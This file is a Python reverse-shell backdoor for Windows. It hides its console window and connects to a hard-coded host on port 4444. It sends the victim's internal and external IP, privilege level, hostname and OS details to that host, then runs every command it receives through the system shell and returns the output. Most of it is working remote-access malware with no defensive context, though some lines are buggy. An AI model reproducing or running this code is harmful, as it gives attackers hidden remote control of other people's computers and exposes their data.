import socket
import subprocess
import os
import platform
import ctypes
ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
connection=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connection.connect(("192.168.11.138",4444))
external_ip = os.popen('curl -s ifconfig.me').readline()
print (external_ip)
def admin():
    try:
        is_admin=(os.getuid()==0)
    except AttributeError:
        is_admin=ctypes.windll.shell32.IsUserAnAdmin()!=0
    return is_admin
if admin():
    priv = "Admin!"
else:
    priv = "just user"
connection.send("\n [+]IP Address     : "+socket.gethostbyname(socket.gethostname()))
connection.send("\n [+]External IP    : "+external_ip)
connection.send("\n [+]Privilege      : "+priv)
connection.send("\n [+]Username       : "+socket.gethostname())
connection.send("\n [+]Home Directorie: "+os.path.abspath('>'))
connection.send("\n [+]System         : "+platform.system())
connection.send("\n [+]OS             : "+platform.platform())
connection.send("\n [+]Machine        : "+platform.machine())
connection.send("\n [+]Architecture   : "+str(platform.architecture()))
connection.send("\n [+]Version        : "+platform.version())
connection.send("\n [+]Machine Details: "+str(platform.uname()))
"\n"
while True:
        try:
                message="\n\naf@shell#".encode("utf-8")
                connection.send(message)
                command=connection.recv(1024).decode("utf-8")
                result=subprocess.check_output(command,shell=True)
                connection.send(result)
        except Exception as e:
                connection.send(e,"unknown command")
connection.close()
